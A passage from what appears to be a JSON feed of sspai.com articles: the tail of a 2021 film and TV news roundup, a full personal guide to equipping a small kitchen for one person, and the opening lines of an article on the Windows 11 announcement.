日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1af4y1t7gE\" target=\"_blank\"><strong>动画电影《扶桑花之舞》：</strong></a>水岛精二担任总导演，绵田慎也共同执导，吉田玲子编剧，以福岛县磐城市为舞台，主角夏凪日羽与朋友们为当上扶桑花女孩而努力，2021 年 12 月 3 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1cV411x7a7\" target=\"_blank\"><strong>剧改 TV 动画《NIGHT HEAD 2041》：</strong></a>改编自 1992 年播出的经典日剧《暗夜第六感》，原作者饭田让治担当系列构成、编剧，平川孝充执导，白组制作，7 月 14 日开始播出。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1G54y1H7Rc\" target=\"_blank\"><strong>漫改 TV 动画《女友成堆》：</strong></a>改编自弘幸的同名漫画，桑原智执导，手冢制作，7 月开始播出。向井直也与从小就喜欢的佐木咲成功交往后，又收到同学水濑渚的告白，决定三人同行。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>刘德华确认出演《流浪地球 2》</h3>\n<p>6 月 18 日，刘德华在直播中透露，他将出演《流浪地球 2》。该片由郭帆执导，刘慈欣监制，将于 2023 年大年初一中国内地上映。</p>\n<h3>罗泓轸编剧并担任制片人的新片《灵媒》发布海报</h3>\n<p>6 月 22 日，泰国导演班庄·比辛达拿刚执导，韩国导演罗泓轸编剧并担任制片人的电影《灵媒》发布海报。该片是一部萨满教题材的恐怖片，讲述泰国乡村里一个受神启示世代相传的巫师家族三个月发生的故事，将于 7 月 14 日韩国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/1f0eb5854feb9edfad2ac6b1ff011835\"></figure><h3>《性爱自修室》第三季 9 月 17 日上线 Netflix</h3>\n<p>6 月 24 日，《性爱自修室》第三季发布剧照。第三季由阿萨·巴特菲尔德、吉莲·安德森、艾玛·麦基、舒提·盖特瓦、康纳·斯温德尔、艾米·卢·伍德、凯达·威廉姆斯特灵等主演。本季共 8 集，将于 9 月 17 日上线 Netflix。</p>\n<h3>《美国恐怖故事集》7 月 15 日开播</h3>\n<p>6 月 22 日，《美国恐怖故事》衍生剧集《美国恐怖故事集》发布全新海报。该剧包括多集长 1 小时的独立完整故事，将于 7 月 15 日开播。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/306ab2252da759400b577c7ebb75e578\"></figure><h3>Hulu 正式宣布续订《外星也难民》第四季</h3>\n<p>6 月 2 日，Hulu 正式宣布续订《外星也难民》第四季。该剧围绕四名在地球上生活的外星人展开。第三季将于 2022 年开播。</p>\n<h3>更多</h3>\n<p><strong>第 74 届戛纳电影节主竞赛评审团阵容官宣：</strong>第 74 届戛纳电影节主竞赛单元评审团成员揭晓：玛吉·吉伦哈尔、梅拉尼·罗兰、宋康昊、塔哈·拉希姆、玛缇·迪欧普、杰茜卡·豪丝娜、小克莱伯·门多萨、玛莲·法莫。斯派克·李担任评审团主席。本届戛纳电影节将于 7 月 6 日—17 日举行。</p>\n<p><strong>动作惊悚片《火药奶昔》发布全新海报：</strong>由亚伦·凯沙勒斯、诺瓦特·帕普沙多执导，凯伦·吉兰、琳娜·海蒂、杨紫琼、 安吉拉·贝塞特等主演的电影《火药奶昔》发布全新海报。该片将于 7 月 14 日在 Netflix 美国上线，其他国家地区暑期上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/f6f7e5a36586b0bee6e857dc867d43d2\"></figure><p><strong>木村拓哉、长泽雅美主演《假面之夜》发布首款海报：</strong>根据东野圭吾小说改编，由铃木雅之执导，木村拓哉、长泽雅美主演的《假面之夜》发布首款海报。该片为《假面饭店》的续集，将于 9 月 17 日日本上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/72670bfbf0178ba79c8ca49a1adf8961\"></figure><p><strong>《生吃》导演朱利亚·迪库诺自编自导新片《钛》发布海报：</strong>《生吃》演朱利亚·迪库诺自编自导的第二部长片《钛》发布正式海报。该片已入围第 74 届戛纳电影节主竞赛单元，并将于 7 月 14 日法国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/d5fdc144518a25825a9192b2a09a855e\"></figure><p><strong>《我的天才女友》第三季首发剧照：</strong>《我的天才女友》第三季首发剧照。本季改编自埃琳娜·费兰特撰写的「那不勒斯四部曲」中的第三部《离开的，留下的》，由丹尼埃莱·卢凯蒂执导，盖娅·吉拉切、玛格丽塔·马祖可回归出演，将于 2022 年开播。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/30c8f020d2590fbc4b28633eafaf15c3\"></figure><p><strong>Netflix 官宣韩影《首尔大作战》演员阵容：</strong>Netflix 正式官宣犯罪动作商业片《首尔大作战》演员阵容：刘亚仁、高庚杓、李奎炯、朴柱炫、邕圣祐、金成钧、郑雄仁、文素利。影片以 1988 年汉城奥运会为背景，讲述上溪洞的车手们盗取 VIP 秘密资金的故事，计划 2022 年上映。</p>\n<p><strong>漫改 TV 动画《街角魔族》第二季 2022 年 4 月开始播出：</strong>漫改 TV 动画《街角魔族》第二季定于 2022 年 4 月开始在 TBS 电视台播出，本作改编自伊藤出云的同名漫画，樱井弘明执导，J.C.STAFF 制作，第一季 2019 年 7 月播出。因家庭原因觉醒为魔族的少女吉田优子，为解除诅咒向退役魔法少女千代田桃发起挑战。 <a href=\"https://twitter.com/machikado_staff/status/1407987144447115266\" target=\"_blank\">来源</a></p>\n<p><strong>轻改 TV 动画《幼女战记》第二季：</strong>改编自 Carlo Zen 的同名轻小说，上村泰执导，NUT 制作，主角因得罪神灵转生为弃婴谭雅，在战火肆虐的异世界征战，TV 动画第一季 2017 年播出。 <a href=\"https://twitter.com/youjosenki/status/1406235566383910915\" target=\"_blank\">来源</a></p>\n<p><strong>《最终幻想 9》动画版：</strong>日本游戏公司 Square Enix 正与法国动画工作室 Cyber Group Studios 合作，将游戏《最终幻想 9》改编为动画剧集，面向 8 至 13 岁儿童，上线时间待定。 <a href=\"https://kidscreen.com/2021/06/21/cyber-group-lines-up-final-fantasy-ix-series/\" target=\"_blank\">来源</a></p>\n<p><strong>舒淇、白客主演的新片《寻她》在万达之夜曝光：</strong>本片由青年导演陈仕忠执导，讲述勇敢的岭南母亲寻找女儿也寻找自己的故事。舒淇在片中扮演一个独立勇敢的女性，在一次追寻真相的旅程中也拉开了作为女性自我觉醒的帷幕。</p>\n<p>👉🏻 可能错过：<a href=\"https://sspai.com/post/67265\">看什么 · 特别篇丨比博燃的热血片单，陪你迎战郁热夏天</a> <br><strong>                          </strong><a href=\"https://sspai.com/post/66840\" target=\"_blank\">看什么 · 特别篇丨一张带你环游世界的夏日片单</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/67421"},{"title":"独居如何享受烹饪乐趣：我的厨房搭建经验分享","date":"2021-06-25 08:15:16","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>去年夏天毕业后，开启了一人的独居生活，租的房子是房东刚刚装修好的，设备很新而且齐全。小户型，建筑面积只有 44 平，有一个精致的小厨房。入住之后，激情澎湃地开始疯狂布置、添置小物件。厨房顺其自然地成为了布置的重点之一。</p>\n<figure class=\"ss-imgRows\" figcaption=\"我的小厨房 | 左边为刚布置的时候，右边是现在的样子\"><img src=\"https://cdn.sspai.com/2021/06/08/d2eb4b1f0b58d2e0ac3b6c667e7824af.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/7cc1ba42bd2ecd7c54d86af68719696f.jpg\" alt=\"\"></figure><h2>新晋独居青年的厨房捣鼓欲</h2>\n<p>在综合考虑自己做饭更健康、少吃外卖以及相对省钱的因素之后，作为厨房小白的我迫不及待地开启了新晋厨师的生活。并以此打开了购物欲，一股脑地购入了一系列锅碗瓢盆、油盐酱醋，添置了一些收纳和厨具，后来被证实哪些是基础必备的，哪些是头脑发热冲动消费的，哪些是鸡肋的。</p>\n<p>结合<strong>「厨房小」、「一人食」</strong>两个特点的基础上，并经过一年的体验，我逐渐总结出了<strong>一套简单直接的、适合租房使用的、追求性价比的「独居青年如何快速成为厨房小当家的不完全指南」。</strong>另外，本篇文章可扩大适用于为 1-3 人。</p>\n<p>本篇文章就我<strong>「目前厨房正使用的工具」</strong>及其<strong>「优缺点」</strong>进行介绍，希望大家能从中获得布置厨房的小启发。</p>\n<p><strong>目录介绍</strong></p>\n<ul>\n<li>我需要什么厨具家电</li>\n<li>碗碟与刀具</li>\n<li>好用但容易遗忘的好物</li>\n<li>厨房收纳大法好</li>\n<li>那么问题来了：我不会做饭啊</li>\n</ul>\n<h2><strong>我需要什么厨具家电</strong></h2>\n<p>小家电、厨具是厨房中的主角，这里自动认定厨房带有冰箱，所以这里不再列明冰箱。一起来看看哪些是必备的吧。</p>\n<h3><strong>01 电高压锅 |「蒸饭和煮粥」</strong></h3>\n<blockquote><p>别买电饭煲了，买电高压锅吧，还能煮粥煲汤呢。</p></blockquote>\n<p>作为一个碳水米饭爱好者，煮饭工具纳入 TOP1 购买清单。本来在反复纠结买哪一款电饭煲，一问朋友，朋友一语惊醒梦中小白。在不过于苛求米饭的口感的前提下，我果断选择了性价比高的电高压锅，并且锁定了适合 1-3 人饭量的 2.5L 小电高压锅（5L 太大，购买时注意分清），最终购入下面这款。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/03/f38868740fe582c5b0d04951cb9d4a73.jpg\"><figcaption><strong>美的 2.5L 电压力锅 25A1</strong> | 参考价：269RMB</figcaption></figure><ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>\n<strong>真的可以只煮一个人一餐的米饭</strong> | 60-70ml，1:1 的水，几乎没有锅巴，一个人吃一餐（在不想吃隔夜饭的前提下）。</li>\n<li>\n<strong>功能面板一目了然</strong> | 5 秒直接上手，该煮饭煮饭，该煮粥煮粥。</li>\n<li>\n<strong>可预约时间 |</strong> 作为第二天要带便当去上班的打工人来说非常友好，提前一天晚上淘好米，设置定时。早晨起床时饭已经煮好了。（譬如，今天晚上 22:30 装好米，设置 8:30h 后自动煮饭，也就是第二天早上 7:00 开始煮饭，1-2 个人的米饭量大概 15-20 分钟就能煮好，很迅速。）</li>\n<li>\n<strong>可保温 |</strong> 大部分电高压锅都能做到，老式高压锅则可能存在不能保温的问题。这一点很重要，不必刻意计算开饭时间，米饭都可以作为第一步先蒸上，不论何时开饭，都是热腾腾的。</li>\n<li>\n<strong>功能全面</strong> | 除了煮饭，我还经常用来煮粥，这款有个叫「宝宝粥」的功能，我用来煮绿豆、红豆粥，可以煮的很烂。除此之外，还用来熬过骨头汤，用电高压锅压一下，骨头会烂很多。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/be25c42b9b970eef4ea2844771e5e5bd.jpg\"><figcaption>普通熬粥模式下，红豆压得不够烂 | 当时还没尝试「宝宝粥」模式</figcaption></figure><ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>\n<strong>二次加热时下气巨慢，需要手动放气。煮粥为了更烂，我会采取二次加热。</strong>但只要是液体，下气的时候粥会从排气口飞溅（扶额），很难清理；</li>\n<li>\n<strong>产品的一些间隙难清理</strong>。锅和内胆之间的缝隙以及锅后面的凹槽等，存在难清理的角落。</li>\n</ol>\n<p>综上，电高压锅作为必备选项，我认为在选购时可以参考几个条件：</p>\n<ol>\n<li>小容量 2.5L（1-3人）；</li>\n<li>功能面板简单好上手；</li>\n<li>具备煮饭煮粥煮汤的基本功能；</li>\n<li>可预约可保温；</li>\n<li>好清理。</li>\n</ol>\n<h3><strong>02 微波炉 |「速食利器」</strong></h3>\n<blockquote><p>有微波炉在，甚至不用开火了。</p></blockquote>\n<p>微波炉一直是爸妈家里常年必备。想必不用多说，同样是生活中不可或缺的小家电之一。尤其在回蒸旧菜，加热早餐，下班只想吃一个加热 4 分钟即可获得的方便芝士炒年糕时，你就会感叹微波炉之妙。</p>\n<p>由于租的房子没有配备微波炉，于是我以<strong>「只要具备微波炉基本加热功能」</strong>为目标，入手了一台。（后来发现公司的微波炉也是同款。）</p>\n<figure class=\"ss-imgRows\" figcaption=\"美的微波炉 M1-L213B 21升  | 参考价：299RMB | 我把微波炉放在冰箱上\"><img src=\"https://cdn.sspai.com/2021/06/07/147784739c891c4d1ba46b28ebde3183.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/b8c4caf0b8db5912aa966c79d339595a.jpg\" alt=\"\"></figure><p> </p>\n<p>个人认为如果<strong>只是租房或者不追求微波炉太强的功能，可以选择这样的「转盘式」的最朴实的款式，价位大约在 250-450RMB 区间，</strong>选择的空间挺大。转盘清理也很方便。（高端款的微波炉可以配置蒸锅，实现蒸鸡蛋、蒸包子的功能，普通微波炉千万不要用来直接加热鸡蛋，会爆炸哦。）</p>\n<p>在没买微波炉前，每天用小奶锅来煮牛奶，由于早上洗漱紧张没时间一直盯着火，所以无一例外每次都熬不过牛奶沸腾之后扑出来的结果。</p>\n<p>微波炉对于上班族还是非常友好，我的使用频率几乎是每天。譬如早上 1 分钟低火加热一下牛奶。冬天做好的菜凉的太快，可以用微波炉回温。下班用 3 分钟中高火加热一下晚餐。</p>\n<p>加之现在诸多速食半成品的熟食，都可以直接用微波炉实现加热。</p>\n<p>上述是我认为必备的2个小家电，除此之外再介绍必备的厨具。</p>\n<h3><strong>03 一口炒锅 |「不粘锅」or 「铁锅」</strong></h3>\n<p>购买其一即可。在这里只有一个建议：<strong>懒人不要买铁锅。</strong>（真诚的目光）</p>\n<p>事情源于，在妈妈不断念叨「铁锅炒菜香」之下，我开心的购买了一个铁锅。并查阅了相关资料，<strong>铁锅非常需要保养</strong>，比如需要一块肥肉开锅。买了一块很贵的肥猪肉准备开锅。</p>\n<p>紧接着，肥猪肉尚未下锅。我好朋友给我寄了一口她觉得非常好用的「不粘锅」，我顺理成章地用上了。现在属于「用不粘锅烹炒万物」的状态。</p>\n<p>事情的结局是——那块肥猪肉还躺在冰箱里冰冻层里 ;D。</p>\n<figure class=\"ss-imgRows\" figcaption=\"不粘锅烹炒万物 | Tronyoo 麦饭石不粘锅 | 参考价：199RMB\"><img src=\"https://cdn.sspai.com/2021/06/04/5cf33bd52c9be46721a26408a0d359ea.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/04/583053ab9c0ce5430aa3611bb614d43f.jpg\" alt=\"\"></figure><p>在这里梳理一下两种炒锅的优缺点，供大家参考。</p>\n<h4><strong>「铁锅」</strong></h4>\n<ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>炒菜更香；</li>\n<li>炒菜可以用铁锅铲；清洁时可以用钢丝球；</li>\n<li>有利于人体对铁物质的吸收（我妈说的）。</li>\n</ol>\n<ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>需要开锅，开锅后需要用心保养；</li>\n<li>相对较重（女生单手吃力）；</li>\n<li>新手可能糊锅。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/d5d015436768d6f9b75586a38fe6d4e0.jpg\"><figcaption>不粘锅烹煮万物之 <strong>「</strong>意式肉酱面<strong>」</strong></figcaption></figure><h4><strong>「不粘锅」</strong></h4>\n<ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>重量轻，可以单手拿；</li>\n<li>炒菜不沾，新手友好（尤其是煎鸡蛋等）；</li>\n<li>颜值高。</li>\n</ol>\n<ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>不粘锅涂层可能对人体有害；</li>\n<li>必须使用硅胶铲或者木铲。</li>\n</ol>\n<h3><strong>04  汤锅 / 蒸锅一体 |「健康餐必备」</strong></h3>\n<p>作为口味清淡的两广人，有两个需求。<strong>第一，能煮汤（还有螺蛳粉）。第二，基于少有少盐的考虑，我经常水煮青菜。尤其是在追求健康餐的前提下，蒸玉米、红薯则是必备。</strong></p>\n<p>如果你也是这样，那么汤锅和蒸锅则是你的必备。然而我在这个选项上走了弯路。家里一共上三个锅，<strong>一个小奶锅（含蒸格）、一个大蒸锅、一个大汤锅，实际上它们完全可以是一个锅。</strong></p>\n<p>我购入的三口锅，正好说一下他们各自特点：</p>\n<ul><li>\n<strong>16cm 的小奶锅</strong>：尺寸迷你，方便，使用频率 top 1 —— 方便且适合蒸一人食的包子、鸡蛋，以及煮一人食的面条或者汤粥。但对于紫薯、红薯，有点难蒸透，水甚至会烧干。粽子、玉米等稍微大的食物放不下。</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/58111d41f20a8f2d5c2b6c01cddd73da.jpg\"><figcaption><strong>九阳小奶锅 16cm</strong> | 参考价：59 RMB（带蒸格） </figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/089722ed38cf1bfa3643fba690c2c11d.jpg\"><figcaption>简直是为<strong>「一人食」</strong>量身定做 | 煮螺蛳粉、煮泡菜饺、蒸小笼包、蒸小红薯</figcaption></figure><ul><li>\n<strong>24cm 的蒸锅</strong>：尺寸大，适合蒸玉米、香肠、红薯、粽子且可以同时蒸；去掉蒸格，也可以是汤锅。</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/48a10c5d0f2b945006bec48f64a5b238.jpg\"><figcaption><strong>华帝 304 不锈钢蒸锅二层 24cm</strong> | 参考价：66RMB</figcaption></figure><ul><li>\n<strong>22cm 的汤锅</strong>：只能煮汤，尺寸过大，鸡肋。如果要丢弃一个锅，我会把它扔掉。</li></ul>\n<p><strong>综上，</strong></p>\n<p><strong>如果只要一个锅，我的建议是：</strong>一个 20-22cm，蒸锅汤锅一体（二层），下面煮汤，上面蒸，足够放进一个玉米。</p>\n<p><strong>如果可以接受两个锅，我的建议是：</strong>一个带蒸锅的小奶锅，建议尺寸 16-18cm，很方便。可以早餐蒸几个小包子、鸡蛋。一个带蒸格的汤锅，建议尺寸 20-22cm, 煮汤以及蒸大的食物。</p>\n<h2>碗碟与刀具</h2>\n<h3>01 碗和碟</h3>\n<p>众所周知，买碗和杯子就像上学时买好看的本子一样，各个爱不释手就逃不开被闲置的命运。且由于空间限制的问题，<strong>在购买厨房餐具、杯具时要适度，尽量有计划地购买。</strong></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/82a706295440aa9c9b6a4e9d48b42cc6.jpg\"><figcaption>目前家里买的碗碟 | 置物架已经饱和</figcaption></figure><p>以我举例：可以用「<strong>用来做什么 + 需要几个</strong>」来辅助思考。</p>\n<p>用来盛米饭等日常用的小碗 x 4</p>\n<p>用来盛汤、汤面、盛粥 x 2</p>\n<p>用来盛菜的盘子x 4</p>\n<p>……</p>\n<p>碗和碟子还是以个人喜好为主，毕竟自己觉得好看的碗碟，吃起来才会心情愉悦，这里给大家要强调尺寸的重要。众所周知，碗越大，吃的越多。</p>\n<ul>\n<li>「吃饭的小碗」：5 寸以内即可；</li>\n<li>「装菜的碟子」：不宜过大，16-20cm 即可，尽量有深有浅，深碟可以放汤汁多的菜。（家里买的 20、22cm 对我来说已经蛮大了。）</li>\n</ul>\n<figure class=\"ss-imgRows\" figcaption=\"家里的一些碗碟 ｜ 小碗均为 5 寸\"><img src=\"https://cdn.sspai.com/2021/06/08/9f26f88712c1350e58d18b47f2219763.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/978ab5f3f0f6aa1e2ddd22bef0d9e25a.JPG\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"左图蓝色深碟 20cm｜ 白色小碟 18cm｜右图花纹大碟 22cm\"><img src=\"https://cdn.sspai.com/2021/06/08/576a392aed98d7aae658a8dcbafed5b7.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/96f1b5d001bf40264e67bae33b081990.JPG\" alt=\"\"></figure><p>除此以外，这里推荐一个<strong>「泡面碗」</strong>，使用率很高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/07/f8e49a44c8f1b0b5321c65e113ee915f.jpg\"><figcaption><strong>泡面碗</strong>  | <strong>7寸</strong>直耳 | 双耳防烫，大容量适合盛一人份的面、汤、粥均可，还可以放超市买的小烤鸡</figcaption></figure><h3>02 刀具</h3>\n<p>因为不苛求刀具，我直接购入了一整套，一共有 7 件。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/7ce2f142f599d230bc47e638ad919cc4.jpg\"><figcaption>炊大皇刀具 ｜ 参考价：119 RMB</figcaption></figure><p>经过使用后，<strong>个人认为如果必备的有 4 把刀：切片刀（大刀用来斩切大块的肉类）、三德刀（可以切肉片或者蔬菜水果）、水果刀、厨房剪。</strong></p>\n<hr>\n<h2>好用但容易遗忘的好物</h2>\n<h3>01 一根很长的筷子</h3>\n<p>煎炸防烫，怕被油溅星人福音。每次煎鸡翅下锅时，真的是恨不得自己离灶台五米远。</p>\n<p>购入了一双 42cm 的超长筷子，非常喜感，但是有种玩黑科技的爽感。</p>\n<figure class=\"ss-imgRows\" figcaption=\"42cm 超长筷子 米木日式家居 |  参考价： 2.4 RMB | 左图为在同事家煎鸡翅\"><img src=\"https://cdn.sspai.com/2021/06/07/5c54d04a908e0b18e2e7701b1304274c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/05e3109c0ae8772b8822e2026880d4e2.jpg\" alt=\"\"></figure><h3>02 硅胶食品夹</h3>\n<p>对我而言的万能硅胶夹，怕烫星人必备，可以用来夹各种烫的食物。比如，刚出锅的玉米，刚出锅的粽子，甚至直接用来夹蒸架。</p>\n<p>还能用来搅拌意面和肉酱。</p>\n<figure class=\"ss-imgRows\" figcaption=\"硅胶食品夹 | 参考价：9.9 RMB | 可用来搅拌意面和芝士碎\"><img src=\"https://cdn.sspai.com/2021/06/07/65f120eabb4425d0d5e0d7838a636819.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/81d47b490d5dd82d71cce26dd929c151.jpg\" alt=\"\"></figure><h3>03 平平无奇的刷碗海绵 </h3>\n<p>因为家里的锅是不粘锅，而且电高压锅内胆和奶锅都不能用钢丝刷，所以我家里清洁均是使用海绵擦。<strong>绿色的一面比较粗糙，很适合刷锅。</strong></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/071af9cadb2516fa66b98e791799f17d.jpg\"><figcaption>刷锅海绵擦 | 参考价：3.6 RMB / 5个</figcaption></figure><h2>厨房收纳大法好</h2>\n<h3>01 冰箱磁铁置物架</h3>\n<p>这可能是厨房里我买的最成功的置物架了，完全节省了我厨房的空间，吸附力巨强，油盐酱醋都可以塞下。配合下述 02 置物架，简直完美。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/236984c4f71c82a12f9951d5f22a86e1.jpg\"><figcaption>鹿谷川 日式冰箱挂架 | 参考价：70 RMB </figcaption></figure><h3>02 移动置物架</h3>\n<p>移动置物架在上图 01 的下方，我用来放置大瓶的酱油、耗油等酱料，下面两层放小的奶锅、汤锅。置物架正好弥补了冰箱和灶台之间的空隙，可以说是完美利用空间了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/bed80d40e37e697c394294eeb1582011.png\"><figcaption>美厨 厨房移动置物架 | 参考价：119 RMB </figcaption></figure><h3>03 调味罐收纳</h3>\n<p>下面这个调味料罐收纳也在上图 01 中展示了，非常契合地放在了冰箱挂架最上方（简直就是一套）。我用来放盐、糖和鸡精，三个比较常用的调味料，内置小勺子。厨房必备，千万不要直接用袋子倒盐，否则容易导致手抖造成齁咸的惨剧。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/8c1fe6314271ecb141f80966ac4a0a45.jpg\"><figcaption>米木日式家居 调味罐3个组合装 | 参考价：37 RMB</figcaption></figure><h3>04 沥水架 &amp; 置物架</h3>\n<p>沥水架是厨房必备的收纳，也是增加幸福感的小物件。建议在购买前测量一下尺寸，以免不合适。</p>\n<figure class=\"ss-imgRows\" figcaption=\"鹿谷川 双层碗碟沥水架 |  参考价：75 RMB | 适合1-3人生活厨具\"><img src=\"https://cdn.sspai.com/2021/06/07/05155ddde0f3a816bb9ad9aa1a25f02c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/b9b31140d24c8bb2b3593080a919c2b4.jpg\" alt=\"\"></figure><h3><strong>05 密封米桶</strong></h3>\n<p>购入了大号的米桶，因为容量太大，一个人没必要放满一缸米。所以我把所有五谷杂粮都放进去了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"米木日式家居 米桶大号 |  我把五谷杂粮都放进去了\"><img src=\"https://cdn.sspai.com/2021/06/08/14452c5d4df084d34c4836ea03271d8c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/db0ed5ee2899636c47e2394c92ce3401.jpg\" alt=\"\"></figure><h2>那么问题来了：我不会做饭啊</h2>\n<p>可以说一个人生活之前，对于做饭还是一无所知。每次回家，在老妈的厨房里燃起做饭的热情跃跃欲试时，都会被老妈浇灭。</p>\n<p><strong>厨房已经布置完毕，万事俱备，只欠一身厨艺了。</strong></p>\n<p>也是在朋友们的推荐下，下载了 <strong>「懒饭」「下厨房」</strong> 两个APP，已经可以满足我家常菜的需求了。</p>\n<ul><li><a href=\"http://vcook.xiachufang.com/\" target=\"_blank\">「懒饭」</a></li></ul>\n<ol>\n<li>有各类合集和排行，适合选择困难星人。</li>\n<li>小视频的形式，言简意赅，上手很快。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/08/4bfebbcb1f5ef1f56488bc6ae3c4e770.JPG\"><figcaption>懒饭｜适合选择困难星人，打开排行，看见哪个就做哪个</figcaption></figure><ul><li><a href=\"https://www.xiachufang.com/\" target=\"_blank\">「下厨房」</a></li></ul>\n<ol>\n<li>可以搜索任何自己想做的菜的菜谱。</li>\n<li>很多网友们上传的菜谱，更接地气儿。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/08/eac5bdb3afe058922db7242293fb7773.JPG\"><figcaption>下厨房｜我常用来搜索菜谱</figcaption></figure><p>上班之前，我还是个不下厨房的小白，如今虽然还做不成硬菜，也还是能喂饱自己了。:D</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/b88e7e1168ea274941d6e5b67b38a3e4.jpg\"><figcaption>吃肉吃肉</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/cf852719f30a5d212e6fff21e3a130ef.jpg\"><figcaption>带去公司的便当</figcaption></figure><p>写的很琐碎，但是也算全面了。<strong>希望本篇文章能够帮助到即将毕业开启人生新篇章的小伙伴，以及看完文章想马上开启厨房新篇章的朋友们！</strong></p>\n<p>注：文中产品图片均源于淘宝、京东店铺，产品仅作参考使用，不包含本人任何推广意愿，其余照片均为作者拍摄。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67301\" target=\"_blank\">打造一份营养早餐，你可以从这些方面下手</a></li>\n<li><a href=\"https://sspai.com/post/64109\" target=\"_blank\">食材简单 A+B，属于工作日的一锅流</a></li>\n<li><a href=\"https://sspai.com/post/62184\" target=\"_blank\">做饭半年，995 码农如何做到自备每日工作餐</a></li>\n<li><a href=\"https://sspai.com/post/61750\" target=\"_blank\">料理时间大缩减，用这些美味半成品给自己加个餐</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67012"},{"title":"Windows 11 要更新了，这些变化能让你心动吗？","date":"2021-06-25 06:30:00","description":"\n<p>6 月 24 日晚，微软通过线上发布会正式公布了自家的下一代桌面操作系统更新，此前预热已久但不幸泄露的 Windows 11 也终于来到了大家面前。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 泄露版上手体验</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/0d68284ad5d0541f96c8237b8b066c57\"></figure><p>如果不考虑泄露版，这次 Windows 11 作为 6 